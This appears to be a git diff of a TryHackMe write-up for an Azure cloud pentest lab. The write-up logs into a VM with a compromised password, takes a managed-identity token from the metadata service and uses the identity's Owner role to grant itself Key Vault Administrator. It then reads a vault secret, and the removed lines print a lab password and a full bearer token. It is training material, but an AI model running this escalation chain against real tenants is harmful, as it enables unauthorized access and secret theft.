@@ -1,9 +1,8 @@
-<h1 align="center">Azure: Eyes Wide Shut</h1>
-<p align="center">2025, October 14<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>526</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
-<em>Azure challenge for cloud pentesters: Can you find the attack path and abuse it?</em><br>
-<img width="60px" src="https://github.com/user-attachments/assets/975ffcd7-fd65-4f50-a6fa-01628efe7a91"><br>
-Access it <a href="https://tryhackme.com/room/eyeswideshut">here</a>.<br>
-<img width="1200px" src=""></p>
+
+<h1 align="center"><a href="https://tryhackme.com/room/eyeswideshut">Azure: Eyes Wide Shut</a></h1>
+<h3 align="center">Defending Azure Learning Path &nbsp;|&nbsp; Azure Security Challenges</h3>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9414a50a-ba3e-4c51-b649-5849624dfa66"><br><br>
+If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2011-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>
 
 <h2>Task 1 . Introduction</h2>
 <p>In this challenge, as a cloud pentester, you will <code>recon and attack an Azure tenant</code> to see if you can discover the attack path and move laterally to other resources.</p>
@@ -180,222 +179,214 @@ Good luck!</p>
 <code>••••••••••••••••• ••••••• ••••••••••</code></p>
 
 <p>4.2. What is the flag?<br>
-<code>__________________________________</code></p>
+<code>THM{••••••••••••••••••••••••••••••••••••}</code></p>
 
+<br>
+<h3>Phase 1: Initial Access and Environment Reconnaissance</h3>
+<p>After obtaining compromised credentials for a legitimate user, the first step is to establish a remote session and identify the scope of the available resources.</p>
 <p>
 
-- launch a web browser<br>
-- navigate to <strong>https://portal.azure.com</strong>
-- input <strong>Username</code>, and click <strong>Next</strong><br>
-- input <strong>Temporary Access Pass</code>, and click <strong>Sign In</br>
-- select  <strong>Not now</strong> for <strong>Save password on microsoft.com</strong><br>
-- select <strong>No</strong> for <strong>Stay signed in></strong><br>
-- click <code>All resources</code><br>
-- select <code>LinuxVM</code><br>
-- identify <code>rg-11231466</code><br>
-- click <code>Connect</code><br>
-- click <code>Connect</code><br>
-- identify <code>ssh azureuser@40.71.211.25</code><br>
-- remember <code>WhereIsMyMind$#@!</code> on challenge descriprion<br>
-- SSH</p>
+- <code>Authentication and Portal Navigation</code> &nbsp; : &nbsp; Access the target environment via the Azure Web Portal using the provided temporary credentials.<br>- &nbsp;&nbsp; Navigate to the <strong>Azure Portal</strong><br>- &nbsp;&nbsp; Enter the provided &nbsp; <strong>Username</strong>  &nbsp; and  &nbsp; <strong>Temporary Access Pass</strong> (TAP)<br>- &nbsp;&nbsp; Click &nbsp; <strong>Sign In</strong> and bypass any "Stay Signed In" prompts to maintain a clean session.<br>- &nbsp;&nbsp; Navigate to &nbsp; <strong>All Resources</strong> and locate the <strong>Linux VM</strong><br>- &nbsp;&nbsp; Select the &nbsp; <strong>Connect</strong> blade to retrieve the public IP and connection string.<br>
 
-<img width="1229" height="567" alt="image" src="https://github.com/user-attachments/assets/c24cb619-1a8b-4a92-9071-e8b4290f979a" />
+<img width="1906" height="524" alt="image" src="https://github.com/user-attachments/assets/09b963bb-20f3-4ba1-a749-a52892dc94f5" /><br>
 
-<br>
-<br>
-<br>
+<img width="1903" height="453" alt="image" src="https://github.com/user-attachments/assets/4e598342-6403-4af4-9d78-7866f1e370be" /><br>
+
+<img width="1229" height="567" alt="image" src="https://github.com/user-attachments/assets/c24cb619-1a8b-4a92-9071-e8b4290f979a" /><br> 
+
+<img width="1914" height="781" alt="image" src="https://github.com/user-attachments/assets/44434ab6-7838-4384-bdc8-1671b8a808ff" /><br>
+
+- <code>Host Access via SSH</code> &nbsp; : &nbsp; Establish a secure shell session to the target instance.<br>- &nbsp;&nbsp; Use the compromised password <code>WhereIsMyMind$#@!</code> to authenticate.<br>
+
 
 ```bash
-:~# ssh azureuser@40.71.211.25
+:~# ssh azureuser@xx.xx.xxx.xx
 ```
 
-<img width="1192" height="289" alt="image" src="https://github.com/user-attachments/assets/97fc744d-0324-47db-ade0-500d9123d693" />
+<img width="1244" height="818" alt="image" src="https://github.com/user-attachments/assets/ac6a4a30-d8c8-4107-a881-5e60010e3433" /><br>
 
-<br>
-<br>
-<br>
+<img width="1247" height="129" alt="image" src="https://github.com/user-attachments/assets/01276862-8d5a-4cd6-8791-87aaa73230fb" /><br>
 
-```bash
-azureuser@LinuxVM:~$ curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
-{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzMzMTYsIm5iZiI6MTc2MzkzMzMxNiwiZXhwIjoxNzY0MDIwMDE2LCJhaW8iOiJBV1FBbS84YUFBQUFLVzl2enBJZjFRYy9Mc01BclZoMXY4cnFxU1lvRlo3VUlqbEczSHBIRkZ4a2RaSUhRNmtlVk0ydU9ldDRPamZMMWZWdWlhNmQ2bnh6MUVOb09ITVNicm1mR0xHek1oTVpZNDVVdjBvM2EwOTh2MXFrUjdoYis0V05sL2FoRGYzZyIsImFwcGlkIjoiMjcwN2RkYmItZGI5NC00NGE5LTkwYzUtZDQ2MDllNWU1ZjZjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYTg1OThiMWUtODEzOC00NDc3LThlNzItNjU3MTdlYjM1YjdmIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiJhODU5OGIxZS04MTM4LTQ0NzctOGU3Mi02NTcxN2ViMzViN2YiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJYZWxfUlB4RjRFV203NERZcjNhRkFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiI5IDMiLCJ4bXNfZnRkIjoic04xUVlLMFJMTXdGLURKbGZVQlJWRW1MLTNiWUtqYW9WR0FWTkVyX3pta0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiIxNiA3IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjMxNDY2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.qGevpSl4uXtZX8zQzGZLcXXOqSKDrrigM21xB9CVFkAXkVSP35-jS4QhtGkQDgfgAaJH8iByRkXKKq-bsBl5Vxq3IHcW2GQHu-2uFK4CY4JGC-LGly-joOEgi6AlvbQAEPwPv52IlHCqaKnN-ACImLSoYNA_5ayreRY5PKgR39XKc-bPqX0-MOIM6U-JpzvK1TZi_IqQ2A7xv6XK7lxrSgv83jcGwNF-8wFefiH4HWLF9siHVeOsaSaha3xTFm2i2uZzu6YK6FM45RAtDvtF9Zbr0PLzaaOgNRqJRl9nUIchgHGLwph6t5Zg-dl-jCWrUW3_IklOcpH33yrzFyKvWQ","client_id":"2707ddbb-db94-44a9-90c5-d4609e5e5f6c","expires_in":"86400","expires_on":"1764020016","ext_expires_in":"86399","not_before":"1763933316","resource":"https://management.azure.com/","token_type":"Bearer"}
-```
 
-<p><em>access_token</em></p>
-
-```bash
-eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzMzMTYsIm5iZiI6MTc2MzkzMzMxNiwiZXhwIjoxNzY0MDIwMDE2LCJhaW8iOiJBV1FBbS84YUFBQUFLVzl2enBJZjFRYy9Mc01BclZoMXY4cnFxU1lvRlo3VUlqbEczSHBIRkZ4a2RaSUhRNmtlVk0ydU9ldDRPamZMMWZWdWlhNmQ2bnh6MUVOb09ITVNicm1mR0xHek1oTVpZNDVVdjBvM2EwOTh2MXFrUjdoYis0V05sL2FoRGYzZyIsImFwcGlkIjoiMjcwN2RkYmItZGI5NC00NGE5LTkwYzUtZDQ2MDllNWU1ZjZjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYTg1OThiMWUtODEzOC00NDc3LThlNzItNjU3MTdlYjM1YjdmIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiJhODU5OGIxZS04MTM4LTQ0NzctOGU3Mi02NTcxN2ViMzViN2YiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJYZWxfUlB4RjRFV203NERZcjNhRkFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiI5IDMiLCJ4bXNfZnRkIjoic04xUVlLMFJMTXdGLURKbGZVQlJWRW1MLTNiWUtqYW9WR0FWTkVyX3pta0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiIxNiA3IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjMxNDY2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.qGevpSl4uXtZX8zQzGZLcXXOqSKDrrigM21xB9CVFkAXkVSP35-jS4QhtGkQDgfgAaJH8iByRkXKKq-bsBl5Vxq3IHcW2GQHu-2uFK4CY4JGC-LGly-joOEgi6AlvbQAEPwPv52IlHCqaKnN-ACImLSoYNA_5ayreRY5PKgR39XKc-bPqX0-MOIM6U-JpzvK1TZi_IqQ2A7xv6XK7lxrSgv83jcGwNF-8wFefiH4HWLF9siHVeOsaSaha3xTFm2i2uZzu6YK6FM45RAtDvtF9Zbr0PLzaaOgNRqJRl9nUIchgHGLwph6t5Zg-dl-jCWrUW3_IklOcpH33yrzFyKvWQ
-```
-
-<br>
-<br>
-
-```bash
-azureuser@LinuxVM:~$ sudo snap install powershell --classic
-```
-
-```bash
-azureuser@LinuxVM:~$ powershell
-PowerShell 7.5.4
-PS /home/azureuser>
-```
-
-```bash
-PS /home/azureuser> Install-Module -Name Az -Repository PSGallery -Force
-```
-
-<br>
-<p><em>Connect-AzAccount . syntax</em></p>
-
-```bash
-PS /home/azureuser> Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>
-```
-
-<br>
-<p><em>Connect-AzAccount . practice</em></p>
-
-```bash
-PS /home/azureuser> Connect-AzAccount -AccessToken eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkxNzE2YTlhLWY4ZmYtNDkwZi04ZjNhLWYyZTZkYTZlMTE2NS8iLCJpYXQiOjE3NjM5MzMzMTYsIm5iZiI6MTc2MzkzMzMxNiwiZXhwIjoxNzY0MDIwMDE2LCJhaW8iOiJBV1FBbS84YUFBQUFLVzl2enBJZjFRYy9Mc01BclZoMXY4cnFxU1lvRlo3VUlqbEczSHBIRkZ4a2RaSUhRNmtlVk0ydU9ldDRPamZMMWZWdWlhNmQ2bnh6MUVOb09ITVNicm1mR0xHek1oTVpZNDVVdjBvM2EwOTh2MXFrUjdoYis0V05sL2FoRGYzZyIsImFwcGlkIjoiMjcwN2RkYmItZGI5NC00NGE5LTkwYzUtZDQ2MDllNWU1ZjZjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTE3MTZhOWEtZjhmZi00OTBmLThmM2EtZjJlNmRhNmUxMTY1LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYTg1OThiMWUtODEzOC00NDc3LThlNzItNjU3MTdlYjM1YjdmIiwicmgiOiIxLkFjb0FtbXB4a2ZfNEQwbVBPdkxtMm00UlpVWklmM2tBdXRkUHVrUGF3ZmoyTUJQNkFBREtBQS4iLCJzdWIiOiJhODU5OGIxZS04MTM4LTQ0NzctOGU3Mi02NTcxN2ViMzViN2YiLCJ0aWQiOiI5MTcxNmE5YS1mOGZmLTQ5MGYtOGYzYS1mMmU2ZGE2ZTExNjUiLCJ1dGkiOiJYZWxfUlB4RjRFV203NERZcjNhRkFBIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiI5IDMiLCJ4bXNfZnRkIjoic04xUVlLMFJMTXdGLURKbGZVQlJWRW1MLTNiWUtqYW9WR0FWTkVyX3pta0JkWE5sWVhOMExXUnpiWE0iLCJ4bXNfaWRyZWwiOiIxNiA3IiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMTc0NjI5NGEtNWFhOC00Y2JiLTgyYTQtMTFlNzMxYjIwOTQyL3Jlc291cmNlZ3JvdXBzL3JnLTExMjMxNDY2L3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvTGludXhWTSIsInhtc19yZCI6IjAuNDJMallCSmlPc1VvSk1MQktTVHc5RWpqUExXWGYzMGFmMDkxbkRXVFlUbFFsRU5Jd00yanZwSmgxM1hfWGM2M0R2NzRaaUFNQUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoiMTcxMTk5MzE1OSJ9.qGevpSl4uXtZX8zQzGZLcXXOqSKDrrigM21xB9CVFkAXkVSP35-jS4QhtGkQDgfgAaJH8iByRkXKKq-bsBl5Vxq3IHcW2GQHu-2uFK4CY4JGC-LGly-joOEgi6AlvbQAEPwPv52IlHCqaKnN-ACImLSoYNA_5ayreRY5PKgR39XKc-bPqX0-MOIM6U-JpzvK1TZi_IqQ2A7xv6XK7lxrSgv83jcGwNF-8wFefiH4HWLF9siHVeOsaSaha3xTFm2i2uZzu6YK6FM45RAtDvtF9Zbr0PLzaaOgNRqJRl9nUIchgHGLwph6t5Zg-dl-jCWrUW3_IklOcpH33yrzFyKvWQ -AccountId 2707ddbb-db94-44a9-90c5-d4609e5e5f6c
-
-Subscription name Tenant
------------------ ------
-Az-Subs-B2C-1     91716a9a-f8ff-490f-8f3a-f2e6da6e1165
-
-PS /home/azureuser> 
-```
-
-<img width="1185" height="332" alt="image" src="https://github.com/user-attachments/assets/8e881333-e1e2-424a-9fb1-e140cb00f4df" />
-
-<br>
-<br>
-<br>
-<p>
-
-- akv-11231466<br>
-- rg-11231466</p>
-
-```bash
-PS /home/azureuser> Get-AzResource
-...
-Name              : akv-11231466
-ResourceGroupName : rg-11231466
-ResourceType      : Microsoft.KeyVault/vaults
-Location          : eastus
-ResourceId        : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-11231466/providers/Microsoft.KeyVault/vaults/akv-11231466
-Tags              : 
-```
-
-```bash
-PS /home/azureuser> Get-AzKeyVault -Name akv-11231466 -ResourceGroupName rg-11231466
-```
-
-<img width="1185" height="481" alt="image" src="https://github.com/user-attachments/assets/67619d20-e779-4135-823f-49cf882c077c" />
-
-<br>
-<br>
-<br>
-
-```bash
-PS /home/azureuser> Get-AzKeyVaultSecret -VaultName akv-11231466 -Nam akv-11231466.vault
-Get-AzKeyVaultSecret: Operation returned an invalid status code 'Unauthorized'
-Code: Unauthorized
-Message: AKV10000: Request is missing a Bearer or PoP token.
-```
-
-```bash
-PS /home/azureuser> Get-AzRoleAssignment   
-
-RoleAssignmentName : 1db72df3-57c1-4685-ae2d-b7ef71f09927
-RoleAssignmentId   : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-11231466/providers/Microsoft.Authorization/roleAssignments/1db72df3-57c1-4685
-                     -ae2d-b7ef71f09927
-Scope              : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-11231466
-DisplayName        : 
-SignInName         : 
-RoleDefinitionName : Virtual Machine User Login
-RoleDefinitionId   : fb879df8-f326-4884-b1cf-06f3ad86be52
-ObjectId           : 4bd2b1df-50f0-4c8d-8379-4188bf0a2639
-ObjectType         : User
-CanDelegate        : False
-Description        : 
-ConditionVersion   : 
-Condition          : 
-
-RoleAssignmentName : 8903a05c-e9aa-49d2-ad4a-11c9e5f38f7a
-RoleAssignmentId   : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourcegroups/rg-11231466/providers/Microsoft.Authorization/roleAssignments/8903a05c-e9aa-49d2
-                     -ad4a-11c9e5f38f7a
-Scope              : /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourcegroups/rg-11231466
-DisplayName        : 
-SignInName         : 
-RoleDefinitionName : Owner
-RoleDefinitionId   : 8e3af657-a8ff-443c-a75c-2fe8c4bcb635
-ObjectId           : a8598b1e-8138-4477-8e72-65717eb35b7f
-ObjectType         : ServicePrincipal
-CanDelegate        : False
-Description        : 
-ConditionVersion   : 
-Condition          : 
-```
-
-<img width="1215" height="520" alt="image" src="https://github.com/user-attachments/assets/600997ba-eab4-47c2-b5b7-7c1c2fd15eab" />
-
-<br>
-<br>
-<br>
-
-<img width="1209" height="560" alt="image" src="https://github.com/user-attachments/assets/49ed76c5-0c4d-443a-88be-aa3f6defb045" />
+- <code>Azure CLI Installation</code> (Environment Preparation)&nbsp; : &nbsp; In many lean Linux environments, the Azure Command-Line Interface (CLI) may not be pre-installed. Deploying the CLI is essential for interacting with the Azure Resource Manager (ARM) from the terminal.<br>- &nbsp;&nbsp;- Install the Azure CLI using the official Microsoft deployment script.<br>
 
 ```bash
 azureuser@LinuxVM:~$ curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
-...
+```
+
+- <code>Identify the Managed Identity</code> &nbsp; : &nbsp; query the Azure Instance Metadata Service (IMDS) to check for an associated identity. Then, use the Azure CLI to confirm the Principal ID of the System-Assigned Identity.<br>Discovered:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>PrincipalId</strong> &nbsp; : &nbsp; 28f4a797-3557-4841-b340-e22b2818ed06<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>TenantId</strong> &nbsp; : &nbsp; 91716a9a-f8ff-490f-8f3a-f2e6da6e1165<br>
 
 ```bash
-PS /home/azureuser> az login --identity
+azureuser@LinuxVM:~$ az login --identity
+[
+  {
+    "environmentName": "AzureCloud",
+    "homeTenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
+    "id": "1746294a-5aa8-4cbb-82a4-11e731b20942",
+    "isDefault": true,
+    "managedByTenants": [],
+    "name": "Az-Subs-B2C-1",
+    "state": "Enabled",
+    "tenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
+    "user": {
+      "assignedIdentityInfo": "MSI",
+      "name": "systemAssignedIdentity",
+      "type": "servicePrincipal"
+    }
+  }
+]
 ```
 
 ```bash
-PS /home/azureuser> Install-Module -Name Az -Repository PSGallery -Force
+azureuser@LinuxVM:~/.azure$ az vm identity show -g rg-01119503 -n LinuxVM
+{
+  "principalId": "28f4a797-3557-4841-b340-e22b2818ed06",
+  "tenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
+  "type": "SystemAssigned",
+  "userAssignedIdentities": null
+}
 ```
 
+- <code>Enumerate Cloud Resources</code> &nbsp; : &nbsp; list all resources within the identified Resource Group (rg-01119503) to locate high-value targets like Azure Key Vaults.<br>Discovered:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>Key Vault</strong> &nbsp; : &nbsp; <strong>akv-01119503</strong></p>
+
+```bash
+azureuser@LinuxVM:~$ az resource list -g rg-01119503 -o table
+Name                                            ResourceGroup    Location    Type                                     Status
+----------------------------------------------  ---------------  ----------  ---------------------------------------  ---------
+LinuxVMNSG                                      rg-01119503      eastus      Microsoft.Network/networkSecurityGroups  Succeeded
+LinuxVMPublicIP                                 rg-01119503      eastus      Microsoft.Network/publicIPAddresses      Succeeded
+LinuxVMVNET                                     rg-01119503      eastus      Microsoft.Network/virtualNetworks        Succeeded
+akv-01119503                                    rg-01119503      eastus      Microsoft.KeyVault/vaults                Succeeded
+LinuxVMVMNic                                    rg-01119503      eastus      Microsoft.Network/networkInterfaces      Succeeded
+LinuxVM                                         rg-01119503      eastus      Microsoft.Compute/virtualMachines        Succeeded
+LinuxVM_disk1_ee76848abbd34df6b9a95414fa6bd668  RG-01119503      eastus      Microsoft.Compute/disks                  Succeeded
+```
+
+<br>
+<h3>Phase 2: Privilege Discovery and Escalation</h3>
+<p>The "Over-Permissioned" vulnerability is confirmed by analyzing the Role-Based Access Control (RBAC) assignments for the VM's identity.</p>
+<p>
+
+- <code>Check Role Assignments</code> &nbsp; : &nbsp; identify the specific permissions granted to the Managed Identity at the Resource Group scope.<br>Discovered that the identity is assigned the <strong>Owner</strong> role. While this grants control over the Resource Group, it does not automatically grant <strong>Data Plane</strong> access to Key Vault secrets if RBAC authorization is enabled.<br>
+
+```bash
+azureuser@LinuxVM:~$ az role assignment list --assignee 28f4a797-3557-4841-b340-e22b2818ed06 --all -o table
+
+Principal                             Role    Scope
+------------------------------------  ------  ------------------------------------------------------------------------------
+ab6f2bfb-7289-4c6f-9f00-c227b43d1846  Owner   /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourcegroups/rg-01119503
+```
+
+- <code>Escalate to Data Plane Administrator</code> &nbsp; : &nbsp; leverage the <strong>Owner</strong> role to grant the identity the <strong>Key Vault Administrator</strong> role. This role provides the necessary permissions to manage and read secrets.<br>
+
+```bash
+azureuser@LinuxVM:~$ az role assignment create --role "Key Vault Administrator" --assignee 28f4a797-3557-4841-b340-e22b2818ed06 --scope /subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-01119503
+{
+  "condition": null,
+  "conditionVersion": null,
+  "createdBy": null,
+  "createdOn": "2026-01-11T19:49:09.545498+00:00",
+  "delegatedManagedIdentityResourceId": null,
+  "description": null,
+  "id": "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-01119503/providers/Microsoft.Authorization/roleAssignments/49d1011b-3a02-45ba-9fed-eef337e80998",
+  "name": "49d1011b-3a02-45ba-9fed-eef337e80998",
+  "principalId": "28f4a797-3557-4841-b340-e22b2818ed06",
+  "principalType": "ServicePrincipal",
+  "resourceGroup": "rg-01119503",
+  "roleDefinitionId": "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/providers/Microsoft.Authorization/roleDefinitions/00482a5a-887f-4fb3-b363-3b7fe8e74483",
+  "scope": "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-01119503",
+  "type": "Microsoft.Authorization/roleAssignments",
+  "updatedBy": "28f4a797-3557-4841-b340-e22b2818ed06",
+  "updatedOn": "2026-01-11T19:49:09.681493+00:00"
+}
+```
+
+- <code>Refresh Identity Token:</code> &nbsp; : &nbsp; log out and re-authenticate via the Managed Identity to ensure the new RBAC permissions are reflected in the access token.</p>
+
+```bash
+azureuser@LinuxVM:~$ az logout
+```
+
+```bash
+azureuser@LinuxVM:~$ az login --identity
+[
+  {
+    "environmentName": "AzureCloud",
+    "homeTenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
+    "id": "1746294a-5aa8-4cbb-82a4-11e731b20942",
+    "isDefault": true,
+    "managedByTenants": [],
+    "name": "Az-Subs-B2C-1",
+    "state": "Enabled",
+    "tenantId": "91716a9a-f8ff-490f-8f3a-f2e6da6e1165",
+    "user": {
+      "assignedIdentityInfo": "MSI",
+      "name": "systemAssignedIdentity",
+      "type": "servicePrincipal"
+    }
+  }
+]
+```
+
+<br>
+<h3>Phase 3: Exfiltration of Sensitive Data</h3>
+<p>With the escalated permissions, the final phase involves querying the Key Vault's data plane to retrieve the target secret.</p>
+<p>
+
+- <code>List Key Vault Secrets</code> &nbsp; : &nbsp; identify the names of the secrets stored within the vault.<br>Discovered <strong>flag</strong>.<br>
+
+```bash
+azureuser@LinuxVM:~$ az keyvault secret list --vault-name akv-01119503 --query "[].name" -o tsv
+flag
+```
+
+- <code>Retrieve Secret Value</code> &nbsp; : &nbsp; extract the plaintext value of the identified secret to complete the objective.<br>
+
+```bash
+azureuser@LinuxVM:~$ az keyvault secret show --vault-name akv-01119503 --name "flag" --query value -o tsv
+THM{••••••••••••••••••••••••••••••••••••}
+```
+
+<br>
+<br>
+<h1 align="center">Challenge Completed</h1>
 
 
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3402a3a7-05c2-4938-b81f-fdbf08e252b4"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/00af049d-3126-4a27-8249-c15755bdd685"></p>
+
+<h1 align="center">Defending Azure Learning Path</h1>
+<p align="center"><img height="370px" src="https://github.com/user-attachments/assets/59798f69-9c78-4454-bad0-d8de03dda952">
+                  <img height="267px" src="https://github.com/user-attachments/assets/a9e6fd21-6873-468c-b501-7cb34b478247"><br>
+                  <img width="620px" src="https://github.com/user-attachments/assets/c7cd8ea2-168f-4a1d-80ca-8808c25f0159"><br></p>
 
 
+<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>
+
+<div align="center"><h6>
+
+| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
+|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
+|11     |Medium 🚩 - Azure: Eyes Wide Shut     |10 |     86ᵗʰ  |     3ʳᵈ    |      558ᵗʰ   |        5ᵗʰ     |    138,450  |    1,063    |    86     |
+|8      |Medium ⚙️ - Phishing Unfolding        | 7 |     86ᵗʰ  |     3ʳᵈ    |      508ᵗʰ   |        4ᵗʰ     |    138,372  |    1,062    |    84     |
+|8      |Easy ⚙️ - Introduction to Phishing    | 7 |     96ᵗʰ  |     3ʳᵈ    |    2,479ᵗʰ   |       32ⁿᵈ     |    137,117  |    1,062    |    84     |
+|8      |Medium 🔗 - KaffeeSec - SoMeSINT      | 7 |     98ᵗʰ  |     3ʳᵈ    |    2,847ᵗʰ   |       38ᵗʰ     |    137,052  |    1,062    |    84     |
+|7      |Hard 🚩 - Hack Back                   | 6 |     98ᵗʰ  |     3ʳᵈ    |    2,798ᵗʰ   |       37ᵗʰ     |    136,908  |    1,061    |    84     |
+|7      |Hard 🚩 - Dead End?                   | 6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
